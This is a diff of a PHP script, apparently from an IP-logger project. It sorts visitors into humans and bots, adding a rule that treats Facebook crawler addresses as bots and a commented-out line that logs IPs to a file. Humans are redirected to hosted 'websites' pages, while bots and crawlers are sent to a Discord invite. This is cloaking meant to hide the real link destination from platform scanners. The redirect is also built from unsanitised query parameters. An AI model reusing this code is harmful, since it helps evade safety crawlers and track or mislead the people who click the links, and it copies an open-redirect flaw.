@@ -2,13 +2,15 @@
 function IsValidIP() 
 { 
     //https://github.com/CybrDev/IP-Logger Get_IP
-	$ip = "unknown";
+    $ip = "unknown";
     if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
 	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
 	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
 	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
+	//file_put_contents("ip.txt",$ip."\n",FILE_APPEND);
 	if($ip == "::1") return true; //localhost
-	return preg_match('/^(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)(?:[.](?:25[0-5]|2[0-4]\d|1\d\d|[1-9]\d|\d)){3}$/', $ip); //Is IP like num.num.num.num  NUM is number b/w 0-999 //https://stackoverflow.com/a/31784191/14919621
+	if (strpos($ip, '2a03:2880:') !== false and strpos($ip, '::face:b00c') !== false) return false; //facebook ip
+	return filter_var($ip, FILTER_VALIDATE_IP); //https://stackoverflow.com/a/6211175/11390822
 } 
 
 function IsValidUserAgent() 
@@ -26,9 +28,16 @@ function IsValidUserAgent()
 
 if((IsValidIP() and IsValidUserAgent()) == true) 
 {	//echo "NOT BOT";
-	if(isset($_GET['redirect'])) header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));die();
+	if(isset($_GET['redirect'])) header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));
+	die();
 }
-header( "Location: https://discord.com/invite/Hu5XPGMTuk");
-die();
+else
+{
+	//echo "You are BOT";
+	//file_put_contents("detected.txt","bot_detected\n",FILE_APPEND);
+	header( "Location: https://discord.com/invite/Hu5XPGMTuk");
+	die();	
+}
+
 
 ?>
